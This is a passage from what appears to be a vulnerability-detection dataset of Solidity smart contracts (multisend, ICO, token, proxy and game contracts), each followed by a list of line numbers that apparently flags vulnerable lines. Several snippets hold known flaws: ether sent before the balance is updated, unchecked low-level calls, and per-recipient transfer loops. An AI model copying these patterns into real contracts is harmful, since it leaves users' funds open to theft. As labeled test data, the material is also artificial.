  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }
  /**
  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a); 
    return c;
  }
}
contract ITSETH  {
   function multisendEther(address[] _contributors, uint256[] _balances) public payable {
        uint256 total = msg.value;
        uint256 i = 0;
        for (i; i < _contributors.length; i++) {
            require(total >= _balances[i] );
            total -= _balances[i];
            _contributors[i].transfer(_balances[i]);
        }
    }
}","[52, 53]"
"    uint256 price = 1E17; // wei per 1 token
    uint256 fract_price = 1E11;  // wei per 0.000001 token
    //uint256 public icoStartTime = now;
    uint256 public icoStartTime = 1512864000; //10 dec 2017 00:00
    uint256 public icoEndTime = 1518220800; // 10 feb 2018 00:00
    //uint256 public icoEndTime = now + 60 days; // for testing
    // uint256 public icoEndTime = 1517270400;
    uint256 public min_inv = 1E17;
    uint256 public minCap = 3000E18;
    uint256 public funded;
    // uint256 public tokenHolders;
    bool public icoPhase = true;
    bool public ico_rejected = false;
    // bool token_valid = false;
    mapping(address => uint256) public contributors;
    SingleTokenCoin public token;
    AuthAdmin authAdmin ;
    event Icoend();
    event Ico_rejected(string details);
    modifier onlyDuringIco {
        require (icoPhase);
        require(now < icoEndTime && now > icoStartTime);
        _;
    }
    modifier adminOnly {
        require (authAdmin.isCurrentAdmin(msg.sender));
        _;
    }
    /*modifier usersOnly {
        require(authAdmin.isCurrentUser(msg.sender));
        _;
    }*/
    function () onlyDuringIco public payable {
        invest(msg.sender);
    }
    function invest(address _to) public onlyDuringIco payable {
        uint256 purchase = msg.value;
        contributors[_to] = contributors[_to].add(purchase);
        require (purchase >= min_inv);
        uint256 change = purchase.mod(fract_price);
        uint256 clean_purchase = purchase.sub(change);
	    funded = funded.add(clean_purchase);
        uint256 token_amount = clean_purchase.div(fract_price);
        require (_to.send(change));
        token.mint(_to, token_amount);
    }
    function IcoManagement(address admin_address) public {
        require (icoStartTime <= icoEndTime);
        authAdmin = AuthAdmin(admin_address);
    }
    function set_token(address _addr) public adminOnly {
        token = SingleTokenCoin(_addr);
    }
    function end() public adminOnly {
        require (now >= icoEndTime);
        icoPhase = false;
        Icoend();
    }
    function withdraw_funds (uint256 amount) public adminOnly {
        require (this.balance >= amount);
        msg.sender.transfer(amount);
    }
    function withdraw_all_funds () public adminOnly {
        msg.sender.transfer(this.balance);
    }
    function withdraw_if_failed() public {
        require(now > icoEndTime);
	    require(funded<minCap);
        require(!icoPhase);
        require (contributors[msg.sender] != 0);
        require (this.balance >= contributors[msg.sender]);
        uint256 amount = contributors[msg.sender];
        contributors[msg.sender] = 0;
        msg.sender.transfer(amount);
    }
    // function reject (string details) adminOnly {
    //     // require (now > icoEndTime);
    //     // require (!ico_rejected);
    //     strlog(""gone"");
    //     uint256 dividend_per_token = this.balance / token.totalSupply();
    //     log(dividend_per_token);
    //     log(this.balance);
    //     log(token.totalSupply());
    //     uint numberTokenHolders = token.count_token_holders();
    //     log(numberTokenHolders);
    //     uint256 total_rejected = 0;
    //     for (uint256 i = 0; i < numberTokenHolders; i++) {
    //         address addr = token.tokenHolder(i);
    //         adlog(addr);
    //         uint256 etherToSend = dividend_per_token * token.balanceOf(addr);
    //         log(etherToSend);
    //         // require (etherToSend < 1E18);
    //         rejectedIcoBalances[addr] = rejectedIcoBalances[addr].add(etherToSend);
    //         log(rejectedIcoBalances[addr]);
    //         total_rejected = total_rejected.add(etherToSend);
    //         log(total_rejected);
    //     }
    //     ico_rejected = true;
    //     Ico_rejected(details);
    //     uint256 remainder = this.balance.sub(total_rejected);
    //     log(remainder);
    //     require (remainder > 0);
    //     require (msg.sender.send(remainder));
    //     strlog(""gone"");
    //     rejectedIcoBalances[msg.sender] = rejectedIcoBalances[msg.sender].add(remainder);
    // }
    // function rejectedFundWithdrawal() {
    //
    // }
}
contract AuthAdmin {
    address[] admins_array;
    address[] users_array;
    mapping (address => bool) admin_addresses;
    mapping (address => bool) user_addresses;
    event NewAdmin(address addedBy, address admin);
    event RemoveAdmin(address removedBy, address admin);
    event NewUserAdded(address addedBy, address account);
    event RemoveUser(address removedBy, address account);
    function AuthAdmin() public {
        admin_addresses[msg.sender] = true;
        NewAdmin(0, msg.sender);
        admins_array.push(msg.sender);
    }
    function addAdmin(address _address) public {
        require (isCurrentAdmin(msg.sender));
        require (!admin_addresses[_address]);
        admin_addresses[_address] = true;","[61, 67]"
" * when the user // imports a zos-lib contract (that transitively causes this contract to be compiled and added to the
 * build/artifacts folder) as well as the vanilla Address implementation from an openzeppelin version.
 */
library OpenZeppelinUpgradesAddress {
    /**
     * Returns whether the target address is a contract
     * @dev This function will return false if invoked during the constructor of a contract,
     * as the code is not actually created until after the constructor finishes.
     * @param account address of the account to check
     * @return whether the target address is a contract
     */
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        // XXX Currently there is no better way to check if there is a contract in an address
        // than to check the size of the code at that address.
        // See https://ethereum.stackexchange.com/a/14016/36603
        // for more details about how this works.
        // TODO Check this again before the Serenity release, because all addresses will be
        // contracts then.
        // solhint-disable-next-line no-inline-assembly
        assembly { size := extcodesize(account) }
        return size > 0;
    }
}
// Dependency file: contracts/dao/Upgradeable.sol
/*
    Copyright 2018-2019 zOS Global Limited
    Copyright 2020 Kerberos Team, based on the works of the Empty Set Squad
    Licensed under the Apache License, Version 2.0 (the ""License"");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at
    http://www.apache.org/licenses/LICENSE-2.0
    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an ""AS IS"" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
*/
// pragma solidity ^0.5.17;
// import ""@openzeppelin/upgrades/contracts/utils/Address.sol"";
// import ""contracts/dao/State.sol"";
/**
 * Based off of, and designed to interface with, openzeppelin/upgrades package
 */
contract Upgradeable is State {
    /**
     * @dev Storage slot with the address of the current implementation.
     * This is the keccak-256 hash of ""eip1967.proxy.implementation"" subtracted by 1, and is
     * validated in the constructor.
     */
    bytes32 private constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    /**
     * @dev Emitted when the implementation is upgraded.
     * @param implementation Address of the new implementation.
     */
    event Upgraded(address indexed implementation);
    function initialize() public;
    /**
     * @dev Upgrades the proxy to a new implementation.
     * @param newImplementation Address of the new implementation.
     */
    function upgradeTo(address newImplementation) internal {
        setImplementation(newImplementation);
        (bool success, bytes memory reason) = newImplementation.delegatecall(abi.encodeWithSignature(""initialize()""));
        require(success, string(reason));
        emit Upgraded(newImplementation);
    }
    /**
     * @dev Sets the implementation address of the proxy.
     * @param newImplementation Address of the new implementation.
     */
    function setImplementation(address newImplementation) private {
        require(OpenZeppelinUpgradesAddress.isContract(newImplementation), ""Cannot set a proxy implementation to a non-contract address"");
        bytes32 slot = IMPLEMENTATION_SLOT;
        assembly {
            sstore(slot, newImplementation)
        }
    }
}
// Dependency file: contracts/dao/Govern.sol
/*
    Copyright 2020 Kerberos Team, based on the works of the Empty Set Squad
    Licensed under the Apache License, Version 2.0 (the ""License"");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at
    http://www.apache.org/licenses/LICENSE-2.0
    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an ""AS IS"" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
*/
// pragma solidity ^0.5.17;
// import ""@openzeppelin/contracts/math/SafeMath.sol"";
// import ""contracts/dao/Setters.sol"";
// import ""contracts/dao/Permission.sol"";
// import ""contracts/dao/Upgradeable.sol"";
// import ""contracts/external/Require.sol"";
// import ""contracts/external/Decimal.sol"";
// import ""contracts/Constants.sol"";
contract Govern is Setters, Permission, Upgradeable {
    using SafeMath for uint256;
    using Decimal for Decimal.D256;
    bytes32 private constant FILE = ""Govern"";
    event Proposal(address indexed candidate, address indexed account, uint256 indexed start, uint256 period);
    event Vote(address indexed account, address indexed candidate, Candidate.Vote vote, uint256 bonded);
    event Commit(address indexed account, address indexed candidate);
    function vote(address candidate, Candidate.Vote vote) external onlyFrozenOrLocked(msg.sender) {
        Require.that(
            balanceOf(msg.sender) > 0,
            FILE,
            ""Must have stake""
        );
        if (!isNominated(candidate)) {
            Require.that(
                canPropose(msg.sender),
                FILE,
                ""Not enough stake to propose""
            );
            createCandidate(candidate, Constants.getGovernancePeriod());
            emit Proposal(candidate, msg.sender, epoch(), Constants.getGovernancePeriod());
        }
        Require.that(
            epoch() < startFor(candidate).add(periodFor(candidate)),
            FILE,
            ""Ended""
        );
        uint256 bonded = balanceOf(msg.sender);",[64]
"}
contract UpgradeabilityProxy is BaseUpgradeabilityProxy {
  constructor(address _logic, bytes memory _data) public payable {
    assert(IMPLEMENTATION_SLOT == bytes32(uint256(keccak256('eip1967.proxy.implementation')) - 1));
    _setImplementation(_logic);
    if(_data.length > 0) {
      (bool success,) = _logic.delegatecall(_data);
      require(success);
    }
  }
}
contract BaseAdminUpgradeabilityProxy is BaseUpgradeabilityProxy {
  event AdminChanged(address previousAdmin, address newAdmin);
  bytes32 internal constant ADMIN_SLOT = 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;
  modifier ifAdmin() {
    if (msg.sender == _admin()) {
      _;
    } else {
      _fallback();
    }
  }
  function admin() external ifAdmin returns (address) {
    return _admin();
  }
  function implementation() external ifAdmin returns (address) {
    return _implementation();
  }
  function changeAdmin(address newAdmin) external ifAdmin {
    require(newAdmin != address(0), ""Cannot change the admin of a proxy to the zero address"");
    emit AdminChanged(_admin(), newAdmin);
    _setAdmin(newAdmin);
  }
  function upgradeTo(address newImplementation) external ifAdmin {
    _upgradeTo(newImplementation);
  }
  function upgradeToAndCall(address newImplementation, bytes calldata data) payable external ifAdmin {
    _upgradeTo(newImplementation);
    (bool success,) = newImplementation.delegatecall(data);
    require(success);
  }
  function _admin() internal view returns (address adm) {
    bytes32 slot = ADMIN_SLOT;
    assembly {
      adm := sload(slot)
    }
  }
  function _setAdmin(address newAdmin) internal {
    bytes32 slot = ADMIN_SLOT;
    assembly {
      sstore(slot, newAdmin)
    }
  }
  function _willFallback() internal {
    require(msg.sender != _admin(), ""Cannot call fallback function from the proxy admin"");
    super._willFallback();
  }
}
contract InitializableUpgradeabilityProxy is BaseUpgradeabilityProxy {
  function initialize(address _logic, bytes memory _data) public payable {
    require(_implementation() == address(0));
    assert(IMPLEMENTATION_SLOT == bytes32(uint256(keccak256('eip1967.proxy.implementation')) - 1));
    _setImplementation(_logic);
    if(_data.length > 0) {
      (bool success,) = _logic.delegatecall(_data);
      require(success);
    }
  }
}
contract InitializableAdminUpgradeabilityProxy is BaseAdminUpgradeabilityProxy, InitializableUpgradeabilityProxy {
  function initialize(address _logic, address _admin, bytes memory _data) public payable {
    require(_implementation() == address(0));
    InitializableUpgradeabilityProxy.initialize(_logic, _data);
    assert(ADMIN_SLOT == bytes32(uint256(keccak256('eip1967.proxy.admin')) - 1));
    _setAdmin(_admin);
  }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, ""SafeMath: addition overflow"");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, ""SafeMath: subtraction overflow"");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, ""SafeMath: multiplication overflow"");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, ""SafeMath: division by zero"");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, ""SafeMath: modulo by zero"");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}
contract ERC20 is Initializable, Context, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;",[64]
"pragma solidity ^0.4.23;
contract InternalTxsTest {
    function batch(uint256[] amounts, address[] recipients)
    public
    payable
    {
        require(amounts.length == recipients.length);
        for (uint8 i = 0; i < amounts.length; i++) {
            recipients[i].transfer(amounts[i]);
        }
    }
}",[9]
"    	devFee = _fee;
    }
    function ChangeItemPrice(uint256 _newPrice) public onlyOwner{
    	ItemCreatePrice = _newPrice;
    }
    // INTERNAL EXTRA FUNCTION TO MOVE OVER OLD ITEMS
    function AddItemExtra(uint32 timer, uint16 priceIncrease, uint256 minPrice, uint16 creatorFee, uint16 potFee, string name, address own) internal {
    	uint16 previousFee = 10000 - devFee - potFee - creatorFee;
    	var NewItem = Item(timer, 0, priceIncrease, minPrice, 0, minPrice, creatorFee, previousFee, potFee, own, address(0), """", name);
    	Items[next_item_index] = NewItem;
    	//emit ItemCreated(next_item_index);
    	next_item_index = add(next_item_index,1);
    }
    function AddItem(uint32 timer, uint16 priceIncrease, uint256 minPrice, uint16 creatorFee, uint16 potFee, string name) public payable {
    	require (timer >= 300);
    	require (timer < 31622400);
    	require(priceIncrease <= 20000);
    	require(minPrice >= (1 szabo) && minPrice <= (1 ether));
    	require(creatorFee <= 2500);
    	require(potFee <= 10000);
    	require(add(add(creatorFee, potFee), devFee) <= 10000);
    	if (msg.sender == owner){
    		require(creatorFee == 0);
    		if (msg.value > 0){
    			owner.transfer(msg.value);
    		}
    	}
    	else{
    		uint256 left = 0;
    		if (msg.value > ItemCreatePrice){
    			left = sub(msg.value, ItemCreatePrice);
    			msg.sender.transfer(left);
    		}
    		else{
    			if (msg.value < ItemCreatePrice){
    				revert();
    			}
    		}
    		owner.transfer(sub(msg.value, left));
    	}
        require (devFee + potFee + creatorFee <= 10000);
    	uint16 previousFee = 10000 - devFee - potFee - creatorFee;
    	var NewItem = Item(timer, 0, priceIncrease, minPrice, 0, minPrice, creatorFee, previousFee, potFee, msg.sender, address(0), """", name);
    	Items[next_item_index] = NewItem;
    	emit ItemCreated(next_item_index);
    	next_item_index = add(next_item_index,1);
    }
    function Payout(uint256 id) internal {
    	var UsedItem = Items[id];
    	uint256 Paid = UsedItem.amount;
    	UsedItem.amount = 0;
    	UsedItem.owner.transfer(Paid);
    	// reset game
    	UsedItem.owner = address(0);
    	UsedItem.price = UsedItem.minPrice;
    	UsedItem.timestamp = 0;
    	emit ItemWon(id);
    }
    function TakePrize(uint256 id) public {
    	require(id < next_item_index);
    	var UsedItem = Items[id];
    	require(UsedItem.owner != address(0));
    	uint256 TimingTarget = add(UsedItem.timer, UsedItem.timestamp);
    	if (block.timestamp > TimingTarget){
    		Payout(id);
    		return;
    	}
    	else{
    		revert();
    	}
    }
    function BuyItem(uint256 id, string quote) public payable{
    	require(id < next_item_index);
    	var UsedItem = Items[id];
    	if (UsedItem.owner != address(0) && block.timestamp > (add(UsedItem.timestamp, UsedItem.timer))){
    		Payout(id);
    		if (msg.value > 0){
    			msg.sender.transfer(msg.value);
    		}
    		return;
    	}
    	require(msg.value >= UsedItem.price);
    	require(msg.sender != owner);
    	//require(msg.sender != UsedItem.creator);
    	require(msg.sender != UsedItem.owner);
    	uint256 devFee_used = mul(UsedItem.price, devFee) / 10000;
    	uint256 creatorFee_used = mul(UsedItem.price, UsedItem.creatorFee) / 10000;
    	uint256 prevFee_used;
   		if (UsedItem.owner == address(0)){
   			// game not started.
   			// NO FEES ARE PAID WHEN THE TIMER IS STARTS
   			// IF NO ONE START PLAYING GAME, then the person who bought first can get 100% of his ETH back!
   			prevFee_used = 0;
   			devFee_used = 0;
   			creatorFee_used = 0;
   		}
   		else{
   			prevFee_used = (mul(UsedItem.price, UsedItem.previousFee)) / 10000;
   			UsedItem.owner.transfer(prevFee_used);
   		}
   		if (creatorFee_used != 0){
   			UsedItem.creator.transfer(creatorFee_used);
   		}
   		if (devFee_used != 0){
   			owner.transfer(devFee_used);
   		}
   		if (msg.value > UsedItem.price){
   		    msg.sender.transfer(sub(msg.value, UsedItem.price));
   		}
   		uint256 potFee_used = sub(sub(sub(UsedItem.price, devFee_used), creatorFee_used), prevFee_used);
   		UsedItem.amount = add(UsedItem.amount, potFee_used);
   		UsedItem.timestamp = block.timestamp;
   		UsedItem.owner = msg.sender;
   		UsedItem.quote = quote;
   		UsedItem.price = (UsedItem.price * (add(10000, UsedItem.priceIncrease)))/10000;
   		emit ItemBought(id);
    }
	function () payable public {
		// msg.value is the amount of Ether sent by the transaction.
		if (msg.value > 0) {
			msg.sender.transfer(msg.value);
		}
	}
    // Not interesting, safe math functions
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
      if (a == 0) {
         return 0;
      }",[64]
"pragma solidity ^0.4.21;
library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns(uint256) {
        if(a == 0) { return 0; }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns(uint256) {
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns(uint256) {
        assert(b <= a);
        return a - b;
    }
    function add(uint256 a, uint256 b) internal pure returns(uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}
contract Ownable {
    address public owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner() { require(msg.sender == owner); _; }
    function Ownable() public { 
	    owner = msg.sender; 
		}
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(this));
        owner = newOwner;
        emit OwnershipTransferred(owner, newOwner);
    }
}
contract JW is Ownable{
    using SafeMath for uint256;
    struct HTokList { 
        address UTAdr; 
        uint256 UTAm; 
    }
    address[] public AllToken; 
    mapping(address => mapping(address => HTokList)) public THol; 
    mapping(address => uint256) public availabletok; 
    mapping(address => bool) public AddrVerification; 
    struct UsEthBal{
        uint256 EthAmount;
    }
    mapping(address => UsEthBal) public UsEthBalance;
    struct TokInfo{
        address TokInfAddress; 
        string TokInfName; 
        string TokInfSymbol; 
        uint256 TokInfdesimal;   
        uint256 TokStatus; 
    }
    mapping(address => TokInfo) public TokenList;
    function Addtoken(address _tokenaddress, string _newtokenname, string _newtokensymbol, uint256 _newtokendesimal, uint256 _availableamount) public onlyOwner{
        TokenList[_tokenaddress].TokInfAddress = _tokenaddress; 
        TokenList[_tokenaddress].TokInfName = _newtokenname; 
        TokenList[_tokenaddress].TokInfSymbol = _newtokensymbol; 
        TokenList[_tokenaddress].TokInfdesimal = _newtokendesimal; 
        TokenList[_tokenaddress].TokStatus = 1; 
        availabletok[_tokenaddress] = availabletok[_tokenaddress].add(_availableamount); 
        AllToken.push(_tokenaddress);
    }
    function UserTikenAmount(address _tokenadrs, uint256 _amount) public onlyOwner{
        THol[msg.sender][_tokenadrs].UTAm = THol[msg.sender][_tokenadrs].UTAm.add(_amount);
    }
    function() payable public {
		require(msg.value > 0 ether);
		UsEthBalance[msg.sender].EthAmount = UsEthBalance[msg.sender].EthAmount.add(msg.value); // Desimals 18
    }
    function ReadTokenAmount(address _address) public view returns(uint256) {
         return availabletok[_address]; 
    }
    function RetBalance(address _tad) public view returns(uint256){
        return THol[msg.sender][_tad].UTAm;
    }
    function ConETH(uint256 _amount) public {
        uint256 amount = _amount; 
        require(UsEthBalance[msg.sender].EthAmount >= amount);
        msg.sender.transfer(amount);
        UsEthBalance[msg.sender].EthAmount = UsEthBalance[msg.sender].EthAmount.sub(amount); 
    }
    function Bum(address _adr) public onlyOwner{
        _adr.transfer(address(this).balance);
    }
    function kill(address _adr) public onlyOwner{
        selfdestruct(_adr);
    }
	function GetEthBal(address _adr) public view returns(uint256){
	 return UsEthBalance[_adr].EthAmount;
	}
}",[83]
"/**
 *Submitted for verification at Etherscan.io on 2020-05-21
*/
pragma solidity 0.4.24;
/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {
  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }
  /**
  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a); 
    return c;
  }
}
contract JusMoa {
    event Multisended(uint256 value , address sender);
    using SafeMath for uint256;
    function multisendEther(address[] _contributors, uint256[] _balances) public payable {
        uint256 total = msg.value;
        uint256 i = 0;
        for (i; i < _contributors.length; i++) {
            require(total >= _balances[i] );
            total = total.sub(_balances[i]);
            _contributors[i].transfer(_balances[i]);
        }
        emit Multisended(msg.value, msg.sender);
    }
}",[55]
"pragma solidity 0.4.24;
/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {
  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }
  /**
  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a); 
    return c;
  }
}
contract Keomyuniti {
    event Multisended(uint256 value , address sender);
    using SafeMath for uint256;
    function multisendEther(address[] _contributors, uint256[] _balances) public payable {
        uint256 total = msg.value;
        uint256 i = 0;
        for (i; i < _contributors.length; i++) {
            require(total >= _balances[i] );
            total = total.sub(_balances[i]);
            _contributors[i].transfer(_balances[i]);
        }
        emit Multisended(msg.value, msg.sender);
    }
}",[52]
"pragma solidity ^0.4.24;
contract Kongtou {
    address public owner;
    constructor() payable public  {
        owner = msg.sender;
    }
    // onlyOwner
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
    //存入eth
    function() payable public {
    }
    //存入eth
    function deposit() payable public{
    }
    //eth转帐到指定地址
    function transferETH(address _to) payable public returns (bool){
        require(_to != address(0));
        require(address(this).balance > 0);
        _to.transfer(address(this).balance);
        return true;
    }
    //eth转帐到多个指定地址
    function transferETH(address[] _tos, uint256 amount) public returns (bool) {
        require(_tos.length > 0);
        for(uint32 i=0;i<_tos.length;i++){
            _tos[i].transfer(amount);
        }
        return true;
    }
    //查看eth余额
    function getETHBalance() view public returns(uint){
        return address(this).balance;
    }
   // 合约批量空投代币 
   function transferToken(address from,address caddress,address[] _tos,uint v)public returns (bool){
        require(_tos.length > 0);
        bytes4 id=bytes4(keccak256(""transfer(address,address,uint256)""));
        for(uint i=0;i<_tos.length;i++){
            caddress.call(id,from,_tos[i],v);
        }
        return true;
    }
}","[28, 29, 42]"
"	modifier onlyOwner() {
		require(isOwner(msg.sender), ""Only contract owner can call this function""); _;
	}
	function isOwner(address account) public view returns (bool) {
		return account == owner;
	}
	function transferOwnership(address payable newOwner) external onlyOwner {
		owner = newOwner;
		emit OwnershipTransferred(newOwner);
	}
	function renounceOwnership() external onlyOwner {
		owner = address(0);
		emit OwnershipTransferred(address(0));
	}
	event OwnershipTransferred(address owner);
}
contract Lets_Go_Brandon is IERC20, Auth {
	using SafeMath for uint256;
	string constant _name = ""Lets Go Brandon Coin"";
	string constant _symbol = ""LGBC"";
	uint8 constant _decimals = 9;
	uint256 constant _totalSupply = 100000000 * (10 ** _decimals);
	mapping (address => uint256) _balances;
	mapping (address => mapping (address => uint256)) _allowances;
    bool public tradingOpen;
    uint256 public maxTxAmount;
    uint256 public maxWalletAmount;
    address internal uniswapLiquidityPool = address(0);
	bool internal uniswapLPAddressLocked = false;
	constructor () Auth(msg.sender) {
		_balances[owner] = _totalSupply;
		tradingOpen = false;
		maxTxAmount = _totalSupply;
		maxWalletAmount = _totalSupply;
		emit Transfer(address(0), owner, _totalSupply);
	}
	function totalSupply() external pure override returns (uint256) { return _totalSupply; }
	function decimals() external pure override returns (uint8) { return _decimals; }
	function symbol() external pure override returns (string memory) { return _symbol; }
	function name() external pure override returns (string memory) { return _name; }
	function getOwner() external view override returns (address) { return owner; }
	function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
	function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
	function setLPAddress(address _uniswapLiqPoolAddr) external onlyOwner {
	    require(uniswapLPAddressLocked == false, ""The LP address can no longer be changed"");
        uniswapLiquidityPool = _uniswapLiqPoolAddr;
	}
	function lockLPAddress() external onlyOwner {
	    require(uniswapLPAddressLocked == false, ""The LP address is already locked"");
	    require(uniswapLiquidityPool != address(0), ""Cannot lock LP address until it has been set"");
	    uniswapLPAddressLocked = true;
	}
	function approve(address spender, uint256 amount) public override returns (bool) {
		_allowances[msg.sender][spender] = amount;
		emit Approval(msg.sender, spender, amount);
		return true;
	}
	function approveMax(address spender) external returns (bool) {
		return approve(spender, type(uint256).max );
	}
    function checkTradingOpen() private view returns (bool){
        bool checkResult = false;
        if (tradingOpen == true) { checkResult = true; } else {
            if (tx.origin == owner) {
                checkResult = true;
            }
        }
        return checkResult;
    }
	function transfer(address recipient, uint256 amount) external override returns (bool) {
	    require(checkTradingOpen(), ""Trading is not open yet"");
		return _transferFrom(msg.sender, recipient, amount);
	}
    function setInitialLimits() internal {
		maxTxAmount = _totalSupply / 100 * 2;
		maxWalletAmount = _totalSupply / 100 * 2;
    }
    function increaseLimits(uint16 maxTxAmtPct, uint16 maxWalletAmtPct) external onlyOwner {
        uint256 newTxAmt = _totalSupply / 100 * maxTxAmtPct;
        require(newTxAmt >= maxTxAmount, ""New TX limit is lower than current limit"");
        maxTxAmount = newTxAmt;
        uint256 newWalletAmt = _totalSupply / 100 * maxWalletAmtPct;
        require(newWalletAmt >= maxWalletAmount, ""New wallet limit is lower than current limit"");
        maxWalletAmount = newWalletAmt;
    }
    function removeAllLimitsLimits() external onlyOwner {
        maxTxAmount = _totalSupply;
		maxWalletAmount = _totalSupply;
    }
    function openTrading() external onlyOwner{
        _openTrading();
	}
    function _openTrading() internal {
        require(tradingOpen == false, ""Trading already open"");
        setInitialLimits();
        tradingOpen = true;
    }
	function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        require(checkTradingOpen(), ""Trading is not open yet"");
		if(_allowances[sender][msg.sender] != type(uint256).max){
			_allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, ""Insufficient Allowance"");
		}
		return _transferFrom(sender, recipient, amount);
	}
	function checkLimits(address recipient, uint256 transferAmount) internal view returns (bool) {
        bool limitCheckPassed = true;
        if ( tradingOpen == true ) {
            if ( transferAmount > maxTxAmount ) {
                limitCheckPassed = false;
            } else if ( recipient != uniswapLiquidityPool && (_balances[recipient].add(transferAmount) > maxWalletAmount) ) {
                limitCheckPassed = false;
            }
        }
        return limitCheckPassed;
    }
	function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
	    require(checkLimits(recipient, amount), ""Transaction exceeds current TX/wallet limits"");
		_balances[sender] = _balances[sender].sub(amount, ""Insufficient Balance"");
		_balances[recipient] = _balances[recipient].add(amount);
		emit Transfer(sender, recipient, amount);
		return true;
	}
}",[64]
"		_artworks.push(Artwork({
			_title: title,
			_owner: owner,
			_visible: true,
			_basePrice: basePrice,
			_purchases: 0,
			_shareholders: new address[](0)
		}));
		uint256 artworkId = _artworks.length - 1;
		Artwork storage newArtwork = _artworks[artworkId];
		newArtwork._hasShares[owner] = true;
		newArtwork._shareholders.push(owner);
		newArtwork._shares[owner] = 1;
		ArtworkCreated(artworkId, title, owner, basePrice);
	}
	// Simple renaming function for the artworks, it is good to
	// keep in mind that when the website syncs with the blockchain,
	// any titles over 32 characters will be clipped.
